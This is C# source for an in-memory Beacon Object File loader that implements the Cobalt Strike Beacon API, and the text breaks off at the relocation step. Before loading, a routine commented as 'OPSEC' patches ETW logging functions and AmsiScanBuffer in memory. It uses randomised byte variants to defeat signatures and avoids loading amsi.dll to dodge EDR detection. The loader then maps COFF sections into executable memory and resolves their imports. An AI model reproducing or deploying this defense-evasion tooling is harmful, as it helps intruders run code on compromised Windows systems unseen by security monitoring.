using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class BofLoader {

    // ---- Win32 ----
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    [DllImport("kernel32.dll")]
    static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

    // SIZE_T and PSIZE_T are 8 bytes on x64. Declaring them as uint
    // works by accident on today's CLR because the argument slots
    // are 8-byte aligned and the marshaller zero-extends smaller
    // integers, but it is a contract mismatch and a stack-write
    // hazard. Use IntPtr / UIntPtr to match the native types.
    [DllImport("ntdll.dll")]
    static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress,
        byte[] buffer, IntPtr size, out IntPtr written);

    [DllImport("ntdll.dll")]
    static extern int NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr baseAddr,
        ref IntPtr size, uint newProtect, out uint oldProtect);

    const uint MEM_COMMIT         = 0x1000;
    const uint MEM_RESERVE        = 0x2000;
    const uint MEM_RELEASE        = 0x8000;
    const uint PAGE_READONLY      = 0x02;
    const uint PAGE_READWRITE     = 0x04;
    const uint PAGE_EXECUTE_READ  = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    const uint IMAGE_SCN_MEM_READ    = 0x40000000;
    const uint IMAGE_SCN_MEM_WRITE   = 0x80000000;

    const int  MAX_OUTPUT_BYTES = 4 * 1024 * 1024;
    const int  PAGE_SIZE        = 0x1000;

    // Try direct RX allocation + NtWriteVirtualMemory for executable sections.
    // Falls back to RW + VirtualProtect if the kernel rejects the write.
    const bool TRY_RX_WRITE = true;

    static StringBuilder _out = new StringBuilder(4096);

    // =====================================================================
    // OPSEC: ETW + AMSI in-process patches (best-effort, once per process)
    // =====================================================================

    static bool _patched = false;
    static Random _rng = new Random();

    static void _WriteBytes(IntPtr addr, byte[] patch) {
        if (addr == IntPtr.Zero) return;
        uint old;
        IntPtr a = addr, sz = (IntPtr)patch.Length;
        if (NtProtectVirtualMemory(GetCurrentProcess(), ref a, ref sz,
                                   PAGE_EXECUTE_READWRITE, out old) != 0) return;
        Marshal.Copy(patch, 0, addr, patch.Length);
        IntPtr a2 = addr, sz2 = (IntPtr)patch.Length;
        NtProtectVirtualMemory(GetCurrentProcess(), ref a2, ref sz2, old, out old);
    }

    static void _ApplyPatchesOnce() {
        if (_patched) return;
        _patched = true;
        try {
            IntPtr ntdll = GetModuleHandleA("ntdll.dll");
            if (ntdll != IntPtr.Zero) {
                // Three equivalent no-op variants. The caller sees a normal
                // return either way; the byte sequence differs per process.
                byte[][] variants = new byte[][] {
                    new byte[] { 0xC3 },                          // ret
                    new byte[] { 0x31, 0xC0, 0xC3 },              // xor eax,eax; ret
                    new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }, // mov eax,0; ret
                };
                byte[] pick = variants[_rng.Next(variants.Length)];

                IntPtr e1 = GetProcAddress(ntdll, "EtwEventWrite");
                IntPtr e2 = GetProcAddress(ntdll, "EtwEventWriteFull");
                IntPtr e3 = GetProcAddress(ntdll, "EtwEventWriteEx");
                IntPtr e4 = GetProcAddress(ntdll, "EtwEventWriteTransfer");
                IntPtr e5 = GetProcAddress(ntdll, "EtwEventWriteString");
                IntPtr e6 = GetProcAddress(ntdll, "NtTraceEvent");
                _WriteBytes(e1, pick);
                _WriteBytes(e2, pick);
                _WriteBytes(e3, pick);
                _WriteBytes(e4, pick);
                _WriteBytes(e5, pick);
                _WriteBytes(e6, pick);
            }
            // AmsiScanBuffer -> return an HRESULT the caller treats as a
            // benign non-match. Variant picked per process.
            //
            // Do not load amsi.dll if it is not already present. Loading
            // it just to patch it is a stronger signal than the patch
            // itself — a process with no .NET work has no reason to
            // import AMSI, and any EDR that logs module loads will flag
            // the LoadLibraryA call. If the host has already loaded it
            // (a CLR host, a PowerShell host, an in-process .NET
            // runtime), patch it. Otherwise leave it alone.
            IntPtr amsi = GetModuleHandleA("amsi.dll");
            if (amsi != IntPtr.Zero) {
                // All three HRESULTs are non-S_OK and cause AMSI to
                // report "no detection". The values are chosen so a
                // signature written against one does not match the
                // others. Verified encoding:
                //   0x80070057  E_INVALIDARG
                //   0x80004005  E_FAIL
                //   0x8007000E  E_OUTOFMEMORY
                byte[][] amsiVariants = new byte[][] {
                    new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, // E_INVALIDARG
                    new byte[] { 0xB8, 0x05, 0x00, 0x40, 0x80, 0xC3 }, // E_FAIL
                    new byte[] { 0xB8, 0x0E, 0x00, 0x07, 0x80, 0xC3 }, // E_OUTOFMEMORY
                };
                IntPtr sb = GetProcAddress(amsi, "AmsiScanBuffer");
                _WriteBytes(sb, amsiVariants[_rng.Next(amsiVariants.Length)]);
            }
        } catch { /* best-effort */ }
    }

    // =====================================================================
    // Beacon API: output
    // =====================================================================

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void D_BeaconPrintf(int type, IntPtr fmt,
        IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5,
        IntPtr a6, IntPtr a7, IntPtr a8, IntPtr a9, IntPtr a10);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void D_BeaconOutput(int type, IntPtr data, int len);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void D_BeaconDownload(IntPtr data, int len, int type);

    static D_BeaconPrintf  _del_printf   = _BeaconPrintfImpl;
    static D_BeaconOutput  _del_output   = _BeaconOutputImpl;
    static D_BeaconDownload _del_download = _BeaconDownloadImpl;

    static void _AppendOut(string s) {
        if (s == null || s.Length == 0) return;
        int room = MAX_OUTPUT_BYTES - _out.Length;
        if (room <= 0) return;
        if (s.Length <= room) _out.Append(s);
        else _out.Append(s, 0, room);
    }

    static void _BeaconPrintfImpl(int type, IntPtr fmt,
            IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5,
            IntPtr a6, IntPtr a7, IntPtr a8, IntPtr a9, IntPtr a10) {
        if (fmt == IntPtr.Zero) return;
        string f = Marshal.PtrToStringAnsi(fmt);
        if (f == null) return;
        IntPtr[] argv = new IntPtr[] { a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 };
        _AppendOut(_Format(f, argv));
    }

    static void _BeaconOutputImpl(int type, IntPtr data, int len) {
        if (len <= 0 || data == IntPtr.Zero) return;
        byte[] buf = new byte[len];
        Marshal.Copy(data, buf, 0, len);
        _AppendOut(Encoding.UTF8.GetString(buf));
    }

    static void _BeaconDownloadImpl(IntPtr data, int len, int type) {
        if (len <= 0 || data == IntPtr.Zero) return;
        byte[] buf = new byte[len];
        Marshal.Copy(data, buf, 0, len);
        _AppendOut("[download " + len + " bytes] " + Convert.ToBase64String(buf) + "\n");
    }

    static string _Format(string fmt, IntPtr[] args) {
        StringBuilder sb = new StringBuilder(fmt.Length + 32);
        int ai = 0, fi = 0;
        while (fi < fmt.Length) {
            char c = fmt[fi++];
            if (c != '%') { sb.Append(c); continue; }
            if (fi >= fmt.Length) { sb.Append('%'); break; }
            while (fi < fmt.Length && "-+ #0".IndexOf(fmt[fi]) >= 0) fi++;
            while (fi < fmt.Length && char.IsDigit(fmt[fi])) fi++;
            if (fi < fmt.Length && fmt[fi] == '.') {
                fi++;
                while (fi < fmt.Length && char.IsDigit(fmt[fi])) fi++;
            }
            while (fi < fmt.Length && "lhqLzIjt".IndexOf(fmt[fi]) >= 0) fi++;
            if (fi >= fmt.Length) break;
            char spec = fmt[fi++];
            if (spec == '%') { sb.Append('%'); continue; }
            IntPtr v = (ai < args.Length) ? args[ai++] : IntPtr.Zero;
            switch (spec) {
                case 's': sb.Append(Marshal.PtrToStringAnsi(v) ?? ""); break;
                case 'S': sb.Append(Marshal.PtrToStringUni(v) ?? ""); break;
                case 'd': case 'i': sb.Append(v.ToInt64().ToString()); break;
                case 'u': sb.Append(((ulong)v.ToInt64()).ToString()); break;
                case 'x': sb.Append(v.ToInt64().ToString("x")); break;
                case 'X': sb.Append(v.ToInt64().ToString("X")); break;
                case 'p': sb.Append("0x" + v.ToInt64().ToString("x")); break;
                case 'c': sb.Append((char)(v.ToInt32() & 0xFF)); break;
                case 'f': case 'F': case 'e': case 'E':
                case 'g': case 'G': sb.Append('?'); break;
                default: sb.Append('%'); sb.Append(spec); break;
            }
        }
        return sb.ToString();
    }

    // =====================================================================
    // Beacon API: data parser
    // =====================================================================

    [StructLayout(LayoutKind.Sequential)]
    struct DATAP { public IntPtr original; public IntPtr buffer; public int length; public int size; }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate int    D_DataParse(IntPtr p, IntPtr b, int s);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate IntPtr D_DataExtract(IntPtr p, IntPtr sz);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate int    D_DataInt(IntPtr p);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate short  D_DataShort(IntPtr p);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate int    D_DataLength(IntPtr p);

    static int _DataParse(IntPtr p, IntPtr b, int s) {
        DATAP dp = new DATAP();
        dp.original = b; dp.buffer = b; dp.length = s; dp.size = s;
        Marshal.StructureToPtr(dp, p, false);
        return 0;
    }
    static IntPtr _DataExtract(IntPtr p, IntPtr sz) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 4) return IntPtr.Zero;
        int len = Marshal.ReadInt32(dp.buffer);
        if (len < 0 || len > dp.length - 4) return IntPtr.Zero;
        IntPtr data = (IntPtr)((long)dp.buffer + 4);
        dp.buffer = (IntPtr)((long)data + len);
        dp.length -= 4 + len;
        Marshal.StructureToPtr(dp, p, false);
        if (sz != IntPtr.Zero) Marshal.WriteInt32(sz, len);
        return data;
    }
    static int _DataInt(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 4) return 0;
        int v = Marshal.ReadInt32(dp.buffer);
        dp.buffer = (IntPtr)((long)dp.buffer + 4); dp.length -= 4;
        Marshal.StructureToPtr(dp, p, false);
        return v;
    }
    static short _DataShort(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 2) return 0;
        short v = Marshal.ReadInt16(dp.buffer);
        dp.buffer = (IntPtr)((long)dp.buffer + 2); dp.length -= 2;
        Marshal.StructureToPtr(dp, p, false);
        return v;
    }
    static int _DataLength(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        return dp.length;
    }

    static D_DataParse   _del_dparse = _DataParse;
    static D_DataExtract _del_dext   = _DataExtract;
    static D_DataInt     _del_dint   = _DataInt;
    static D_DataShort   _del_dshort = _DataShort;
    static D_DataLength  _del_dlen   = _DataLength;

    // =====================================================================
    // Beacon API: format buffer
    // =====================================================================

    [StructLayout(LayoutKind.Sequential)]
    struct FORMATP { public IntPtr original; public IntPtr buffer; public int length; public int size; }

    static List<IntPtr> _fmtAllocs = new List<IntPtr>();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void D_FmtAlloc(IntPtr p, int maxsz);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void   D_FmtReset(IntPtr p);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void   D_FmtFree(IntPtr p);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void   D_FmtAppend(IntPtr p, IntPtr text, int len);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void   D_FmtPrintf(IntPtr p, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate IntPtr D_FmtToString(IntPtr p, IntPtr sz);

    static void _FmtAlloc(IntPtr p, int maxsz) {
        if (maxsz <= 0) maxsz = PAGE_SIZE;
        IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)maxsz,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (buf == IntPtr.Zero) return;
        _fmtAllocs.Add(buf);
        FORMATP fp = new FORMATP();
        fp.original = buf; fp.buffer = buf; fp.length = 0; fp.size = maxsz;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtReset(IntPtr p) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        fp.buffer = fp.original; fp.length = 0;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtFree(IntPtr p) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.original != IntPtr.Zero) {
            VirtualFree(fp.original, UIntPtr.Zero, MEM_RELEASE);
            _fmtAllocs.Remove(fp.original);
        }
        fp.original = IntPtr.Zero; fp.buffer = IntPtr.Zero;
        fp.length = 0; fp.size = 0;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtAppend(IntPtr p, IntPtr text, int len) {
        if (len <= 0 || text == IntPtr.Zero) return;
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.buffer == IntPtr.Zero || fp.length + len > fp.size) return;
        byte[] data = new byte[len];
        Marshal.Copy(text, data, 0, len);
        Marshal.Copy(data, 0, (IntPtr)((long)fp.buffer + fp.length), len);
        fp.length += len;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtPrintf(IntPtr p, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4) {
        if (fmt == IntPtr.Zero) return;
        string f = Marshal.PtrToStringAnsi(fmt);
        if (f == null) return;
        string s = _Format(f, new IntPtr[] { a1, a2, a3, a4 });
        byte[] bytes = Encoding.ASCII.GetBytes(s);
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.buffer == IntPtr.Zero || fp.length + bytes.Length > fp.size) return;
        Marshal.Copy(bytes, 0, (IntPtr)((long)fp.buffer + fp.length), bytes.Length);
        fp.length += bytes.Length;
        Marshal.StructureToPtr(fp, p, false);
    }
    static IntPtr _FmtToString(IntPtr p, IntPtr sz) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (sz != IntPtr.Zero) Marshal.WriteInt32(sz, fp.length);
        return fp.original;
    }

    static D_FmtAlloc    _del_falloc  = _FmtAlloc;
    static D_FmtReset    _del_freset  = _FmtReset;
    static D_FmtFree     _del_ffree   = _FmtFree;
    static D_FmtAppend   _del_fappend = _FmtAppend;
    static D_FmtPrintf   _del_fprintf = _FmtPrintf;
    static D_FmtToString _del_ftostr  = _FmtToString;

    // =====================================================================
    // Beacon API: key/value + misc
    // =====================================================================

    static Dictionary<string, IntPtr> _kv = new Dictionary<string, IntPtr>();
    static bool   _AddValue(string k, IntPtr v) { if (k == null) return false; _kv[k] = v; return true; }
    static IntPtr _GetValue(string k) { if (k == null) return IntPtr.Zero; IntPtr v; return _kv.TryGetValue(k, out v) ? v : IntPtr.Zero; }
    static bool   _RemoveValue(string k) { if (k == null) return false; return _kv.Remove(k); }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool   D_AddValue(string k, IntPtr v);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate IntPtr D_GetValue(string k);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool   D_RemoveValue(string k);

    static D_AddValue    _del_add = _AddValue;
    static D_GetValue    _del_get = _GetValue;
    static D_RemoveValue _del_rem = _RemoveValue;

    static bool _IsAdmin() {
        try {
            var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            var p  = new System.Security.Principal.WindowsPrincipal(id);
            return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        } catch { return false; }
    }
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool D_IsAdmin();
    static D_IsAdmin _del_admin = _IsAdmin;

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool D_UseToken(IntPtr token);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool D_RevertToken();
    static bool _UseToken(IntPtr t) { return false; }
    static bool _RevertToken() { return false; }
    static D_UseToken    _del_usetk = _UseToken;
    static D_RevertToken _del_rvtk  = _RevertToken;

    // =====================================================================
    // Vectored exception handler (best-effort)
    // =====================================================================

    delegate int D_VEH(IntPtr info);
    static int _vehFired = 0;
    static D_VEH _vehDel = _VehCb;
    // CONTINUE_SEARCH: report the fault and let the process's own SEH
    // chain decide whether to survive it. This does NOT guarantee that
    // the loader recovers from an arbitrary AV.
    static int _VehCb(IntPtr info) { _vehFired = 1; return 0; /* CONTINUE_SEARCH */ }

    // =====================================================================
    // Symbol resolution (cached)
    // =====================================================================

    static Dictionary<string, IntPtr> _symCache =
        new Dictionary<string, IntPtr>(StringComparer.Ordinal);

    static readonly string[] _fallbackLibs = {
        "kernel32.dll", "user32.dll", "advapi32.dll", "ntdll.dll",
        "msvcrt.dll", "shell32.dll", "ws2_32.dll", "netapi32.dll",
        "ole32.dll", "oleaut32.dll", "shlwapi.dll", "crypt32.dll",
        "bcrypt.dll", "secur32.dll", "iphlpapi.dll", "winhttp.dll",
        "wininet.dll", "psapi.dll", "version.dll", "dbghelp.dll"
    };

    static IntPtr _Resolve(string name) {
        IntPtr cached;
        if (_symCache.TryGetValue(name, out cached)) return cached;

        IntPtr result;
        switch (name) {
            case "BeaconPrintf":     result = Marshal.GetFunctionPointerForDelegate(_del_printf); break;
            case "BeaconOutput":     result = Marshal.GetFunctionPointerForDelegate(_del_output); break;
            case "BeaconDownload":   result = Marshal.GetFunctionPointerForDelegate(_del_download); break;
            case "BeaconDataParse":  result = Marshal.GetFunctionPointerForDelegate(_del_dparse); break;
            case "BeaconDataExtract":result = Marshal.GetFunctionPointerForDelegate(_del_dext); break;
            case "BeaconDataInt":    result = Marshal.GetFunctionPointerForDelegate(_del_dint); break;
            case "BeaconDataShort":  result = Marshal.GetFunctionPointerForDelegate(_del_dshort); break;
            case "BeaconDataLength": result = Marshal.GetFunctionPointerForDelegate(_del_dlen); break;
            case "BeaconFormatAlloc":  result = Marshal.GetFunctionPointerForDelegate(_del_falloc); break;
            case "BeaconFormatReset":  result = Marshal.GetFunctionPointerForDelegate(_del_freset); break;
            case "BeaconFormatFree":   result = Marshal.GetFunctionPointerForDelegate(_del_ffree); break;
            case "BeaconFormatAppend": result = Marshal.GetFunctionPointerForDelegate(_del_fappend); break;
            case "BeaconFormatPrintf": result = Marshal.GetFunctionPointerForDelegate(_del_fprintf); break;
            case "BeaconFormatToString": result = Marshal.GetFunctionPointerForDelegate(_del_ftostr); break;
            case "BeaconAddValue":   result = Marshal.GetFunctionPointerForDelegate(_del_add); break;
            case "BeaconGetValue":   result = Marshal.GetFunctionPointerForDelegate(_del_get); break;
            case "BeaconRemoveValue":result = Marshal.GetFunctionPointerForDelegate(_del_rem); break;
            case "BeaconIsAdmin":    result = Marshal.GetFunctionPointerForDelegate(_del_admin); break;
            case "BeaconUseToken":   result = Marshal.GetFunctionPointerForDelegate(_del_usetk); break;
            case "BeaconRevertToken":result = Marshal.GetFunctionPointerForDelegate(_del_rvtk); break;
            default:
                if (name.StartsWith("Beacon")) {
                    throw new Exception("Unsupported Beacon API symbol: " + name);
                } else if (name.IndexOf('$') > 0) {
                    int d = name.IndexOf('$');
                    string lib  = name.Substring(0, d) + ".dll";
                    string func = name.Substring(d + 1);
                    IntPtr h = LoadLibraryA(lib);
                    if (h == IntPtr.Zero) h = GetModuleHandleA(lib);
                    if (h == IntPtr.Zero)
                        throw new Exception("LoadLibrary failed: " + lib +
                            " (err=" + Marshal.GetLastWin32Error() + ")");
                    IntPtr a = GetProcAddress(h, func);
                    if (a == IntPtr.Zero)
                        throw new Exception("GetProcAddress failed: " + name +
                            " (err=" + Marshal.GetLastWin32Error() + ")");
                    result = a;
                } else if (name.StartsWith("__imp_")) {
                    IntPtr real = _Resolve(name.Substring(6));
                    IntPtr slot = VirtualAlloc(IntPtr.Zero, (UIntPtr)8,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (slot == IntPtr.Zero)
                        throw new Exception("VirtualAlloc failed for __imp_ slot");
                    _fmtAllocs.Add(slot);
                    Marshal.WriteIntPtr(slot, real);
                    result = slot;
                } else {
                    IntPtr found = IntPtr.Zero;
                    foreach (string lib in _fallbackLibs) {
                        IntPtr h = GetModuleHandleA(lib);
                        if (h == IntPtr.Zero) continue;
                        IntPtr a = GetProcAddress(h, name);
                        if (a != IntPtr.Zero) { found = a; break; }
                    }
                    if (found == IntPtr.Zero)
                        throw new Exception("Unresolved symbol: " + name);
                    result = found;
                }
                break;
        }
        _symCache[name] = result;
        return result;
    }

    // =====================================================================
    // COFF byte helpers
    // =====================================================================

    static ushort _RU16(byte[] d, int o) { return (ushort)(d[o] | (d[o+1] << 8)); }
    static uint   _RU32(byte[] d, int o) {
        return (uint)(d[o] | (d[o+1] << 8) | (d[o+2] << 16) | (d[o+3] << 24));
    }
    static ulong  _RU64(byte[] d, int o) {
        return (ulong)_RU32(d, o) | ((ulong)_RU32(d, o+4) << 32);
    }
    static short  _RS16(byte[] d, int o) { return (short)_RU16(d, o); }
    static int    _AlignUp(int v, int a) { return (v + a - 1) & ~(a - 1); }

    static uint _FinalProt(uint chars) {
        bool x = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool w = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
        bool r = (chars & IMAGE_SCN_MEM_READ)    != 0;
        if (x) return PAGE_EXECUTE_READ;
        if (w) return PAGE_READWRITE;
        if (r) return PAGE_READONLY;
        return PAGE_READWRITE;
    }

    // Write 4 or 8 bytes to a target address, optionally via NtWriteVirtualMemory
    // when the page is already executable (avoids a VirtualProtect flip).
    static void _WriteI32(IntPtr addr, int val, bool viaKernel) {
        if (viaKernel) {
            byte[] b = BitConverter.GetBytes(val);
            IntPtr w;
            NtWriteVirtualMemory(GetCurrentProcess(), addr,
                                 b, (IntPtr)4, out w);
        } else {
            Marshal.WriteInt32(addr, val);
        }
    }
    static void _WriteI64(IntPtr addr, long val, bool viaKernel) {
        if (viaKernel) {
            byte[] b = BitConverter.GetBytes(val);
            IntPtr w;
            NtWriteVirtualMemory(GetCurrentProcess(), addr,
                                 b, (IntPtr)8, out w);
        } else {
            Marshal.WriteInt64(addr, val);
        }
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void BofEntry(IntPtr args, int alen);

    // =====================================================================
    // Entry point
    // =====================================================================

    public static string[] ExecuteBof(byte[] bof, string entryName, byte[] packedArgs) {
        _out.Length = 0;
        _kv.Clear();

        // OPSEC: suppress ETW and patch AMSI before any memory work.
        _ApplyPatchesOnce();

        if (bof == null || bof.Length < 20) throw new Exception("BOF too small");

        ushort machine = _RU16(bof, 0);
        bool is64;
        if      (machine == 0x8664) is64 = true;   // AMD64
        else if (machine == 0x014c) is64 = false;  // I386
        else
            throw new Exception("Unsupported COFF machine: 0x" + machine.ToString("X4") +
                                " (only AMD64 and I386 are supported)");

        int nsec   = _RU16(bof, 2);
        int symOff = (int)_RU32(bof, 8);
        int nsym   = (int)_RU32(bof, 12);

        if (nsec <= 0) throw new Exception("COFF has no sections");
        if (symOff <= 0 && nsym > 0) throw new Exception("Invalid symbol table offset");

        // ---- 1. Read section headers ----
        int[]    secRawOff    = new int[nsec];
        int[]    secRawSize   = new int[nsec];
        int[]    secRelocOff  = new int[nsec];
        int[]    secRelocCnt  = new int[nsec];
        uint[]   secChars     = new uint[nsec];
        string[] secNames     = new string[nsec];
        int[]    secAllocSize = new int[nsec];

        for (int i = 0; i < nsec; i++) {
            int off = 20 + i * 40;
            if (off + 40 > bof.Length) throw new Exception("Section header out of bounds");
            byte[] nb = new byte[8];
            Array.Copy(bof, off, nb, 0, 8);
            int nl = 0;
            while (nl < 8 && nb[nl] != 0) nl++;
            secNames[i]    = Encoding.ASCII.GetString(nb, 0, nl);
            int vsize      = (int)_RU32(bof, off + 8);
            secRawSize[i]  = (int)_RU32(bof, off + 16);
            secRawOff[i]   = (int)_RU32(bof, off + 20);
            secRelocOff[i] = (int)_RU32(bof, off + 24);
            secRelocCnt[i] = _RU16(bof, off + 32);
            secChars[i]    = _RU32(bof, off + 36);

            int m = Math.Max(vsize, secRawSize[i]);
            if (m < 1) m = 1;
            secAllocSize[i] = _AlignUp(m, PAGE_SIZE);
        }

        // ---- 2. Contiguous allocation (REL32 safety) ----
        int total = 0;
        int[] secOffsets = new int[nsec];
        for (int i = 0; i < nsec; i++) {
            secOffsets[i] = total;
            total = _AlignUp(total + secAllocSize[i], PAGE_SIZE);
        }

        IntPtr blob = VirtualAlloc(IntPtr.Zero, (UIntPtr)total,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (blob == IntPtr.Zero)
            throw new Exception("VirtualAlloc section blob failed (err=" +
                                Marshal.GetLastWin32Error() + ", size=" + total + ")");

        IntPtr[] secMem = new IntPtr[nsec];
        bool[]   rxWritten = new bool[nsec];

        try {
            // ---- 3. Map sections ----
            for (int i = 0; i < nsec; i++) {
                secMem[i] = (IntPtr)((long)blob + secOffsets[i]);
                bool exec = (secChars[i] & IMAGE_SCN_MEM_EXECUTE) != 0;

                if (exec && TRY_RX_WRITE && secRawSize[i] > 0) {
                    // Attempt direct write into an RX page via the kernel.
                    // Pages are currently RW (blob allocation), so try
                    // after flipping to RX first.
                    uint old;
                    VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                   PAGE_EXECUTE_READ, out old);
                    byte[] raw = new byte[secRawSize[i]];
                    Array.Copy(bof, secRawOff[i], raw, 0, secRawSize[i]);
                    IntPtr written;
                    int st = NtWriteVirtualMemory(
                        GetCurrentProcess(), secMem[i],
                        raw, (IntPtr)raw.Length, out written);
                    if (st == 0 && written.ToInt64() == raw.Length) {
                        rxWritten[i] = true;
                    } else {
                        // Fall back: flip back to RW and use Marshal.Copy.
                        VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                       PAGE_READWRITE, out old);
                    }
                }

                if (!rxWritten[i] && secRawSize[i] > 0) {
                    if (secRawOff[i] + secRawSize[i] > bof.Length)
                        throw new Exception("Section " + secNames[i] + " raw data out of bounds");
                    Marshal.Copy(bof, secRawOff[i], secMem[i], secRawSize[i]);
                }
            }

            // ---- 4. Symbol table ----
            int strTabOff = symOff + nsym * 18;
            string[] symNames  = new string[nsym];
            int[]    symSecNum = new int[nsym];
            uint[]   symVal    = new uint[nsym];
            byte[]   symClass  = new byte[nsym];

            for (int i = 0; i < nsym; i++) {
                int off = symOff + i * 18;
                if (off + 18 > bof.Length) throw new Exception("Symbol table truncated");
                ulong nf = _RU64(bof, off);
                uint ff  = (uint)(nf & 0xFFFFFFFF);
                if (ff == 0) {
                    int so = strTabOff + (int)(nf >> 32);
                    int e = so;
                    while (e < bof.Length && bof[e] != 0) e++;
                    symNames[i] = Encoding.ASCII.GetString(bof, so, e - so);
                } else {
                    byte[] nb = BitConverter.GetBytes(nf);
                    int nl = 0;
                    while (nl < 8 && nb[nl] != 0) nl++;
                    symNames[i] = Encoding.ASCII.GetString(nb, 0, nl);
                }
                symVal[i]    = _RU32(bof, off + 8);
                symSecNum[i] = _RS16(bof, off + 12);
                symClass[i]  = bof[off + 16];
            }

            // ---- 5. Resolve symbols ----
            IntPtr[] symAddr = new IntPtr[nsym];
            for (int i = 0; i < nsym; i++) {
                int sn = symSecNum[i];
                if (sn > 0 && sn <= nsec) {
                    symAddr[i] = (IntPtr)((long)secMem[sn - 1] + symVal[i]);
                    continue;
                }
                if (sn == 0 && symClass[i] == 2) {
                    string nm = symNames[i];
                    // Try the name as-is, then a normalised variant for x86
                    // where cdecl prepends "_" and stdcall appends "@N".
                    string[] tries = new string[] { nm };
                    if (!is64) {
                        if (nm.StartsWith("_")) {
                            tries = new string[] { nm, nm.Substring(1) };
                        } else {
                            tries = new string[] { nm, "_" + nm };
                        }
                    }
                    bool ok = false;
                    Exception lastEx = null;
                    foreach (string t in tries) {
                        // Strip trailing @N (stdcall) if present.
                        string cleaned = t;
                        int at = cleaned.IndexOf('@');
                        if (at > 0) cleaned = cleaned.Substring(0, at);
                        try { symAddr[i] = _Resolve(cleaned); ok = true; break; }
                        catch (Exception ex) { lastEx = ex; }
                    }
                    if (!ok)
                        throw new Exception("Symbol '" + nm + "': " +
                            (lastEx != null ? lastEx.Message : "unresolved"));
                } else {
                    symAddr[i] = IntPtr.Zero;
                }
            }

            // ---- 6. Relocations ----
            for (int si = 0; si < nsec; si++) {
